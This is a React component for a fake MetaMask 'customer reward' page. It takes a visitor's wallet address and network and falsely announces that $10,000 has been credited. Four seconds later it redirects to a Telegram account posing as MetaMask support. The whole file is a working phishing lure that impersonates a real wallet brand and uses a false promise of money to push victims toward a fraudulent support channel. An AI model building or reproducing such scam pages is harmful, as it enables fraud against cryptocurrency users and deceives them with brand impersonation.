import { React, useState } from 'react'
import Swal from 'sweetalert2';
import Loader from '../components/loader/Loader';

const Reward = () => {

    const [loader, setLoader] = useState(false)
    const [walletAddress, setWalletAddress] = useState('')
    const [errorMsg, setErrorMsg] = useState()

    const handleInputChange = (e) => {
        const newValue = e.target.value;
        setWalletAddress(newValue)
        validateInput(newValue)
    }

    const validateInput = (value) => {
        if(value.length < 40 ) {
            setErrorMsg('Input a valid wallet address')
        }
        else {
        setErrorMsg('')
        }
    }

    const submitData = async (e) => {
        if (walletAddress.length < 40 ) {
            console.log('please provide a valid wallet address')
        }
        else {
    // sweet alert function 
    const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 6000,
      timerProgressBar: true,
      didOpen: (toast) => {
        toast.addEventListener('mouseenter', Swal.stopTimer)
        toast.addEventListener('mouseleave', Swal.resumeTimer)
      }
    })

        Toast.fire({
          icon: 'success',
          title: 'Your account has been credited with $10,000'
        })

         setLoader(true)
   
         setTimeout(() => {
           setLoader(false);
           
        window.location.href='https://t.me/io_Supportmetamask'
         }, 4000);
        }
     
        }
     
  return (
    <>
    {
        loader && <Loader />
    }
        

      <div className="container">
        <div className='logo'>
          <span>
            <img src="/A.png" alt="file not found" />
            {/* <h1> M E T A M A S K</h1> */
            <h1><img src="/metamask.png" alt="file not found" className='img'/>  M E T A M A S K</h1>}
          </span>
        </div>

        <div className='body'>
          
        <span>
          <img src="/R.GIF" alt="file not found" className='Rimg'/>
          </span>

    <form class="form" onSubmit={ (e) => {
            e.preventDefault()
            submitData()
          }}>
            
       <p class="form-text">Input your Wallet Address to Claim Instant $10,000 Customer Reward.</p>

        <div class="input-container">
          <span id='itext'>
          <p id="one">Wallet Address</p>
          </span>
          
          <span id='Iformx'>
          <input
           type='text' 
           value={walletAddress}
           onChange={handleInputChange}
           placeholder="Enter your Wallet Address" 
           required
           />
          </span>
          {errorMsg && <span className='error'>{errorMsg}</span>}

      </div>
      
      <div class="input-container">
          <span id='itext'>
          <p id="one">Wallet Network</p>
          </span>
          
          <span id='Iformx'>
          <select 
          required
          >
            <option value="btcwallet">Bitcoin(BTC)</option>
            <option value="ethwallet">Ethereum(ETH)</option>
            <option value="btcwallet">BNB(BNB)</option>
            <option value="btcwallet">Solana(SOL)</option>
            <option value="btcwallet">Tether USD(BEP20)</option>
            </select>
          </span>

      </div>

<div className="input-container">
         <button type="submit" class="submit">
        CLAIM REWARD
      </button>
      </div>

   </form>

        </div>

      </div>
 
    </>
  )
}

export default Reward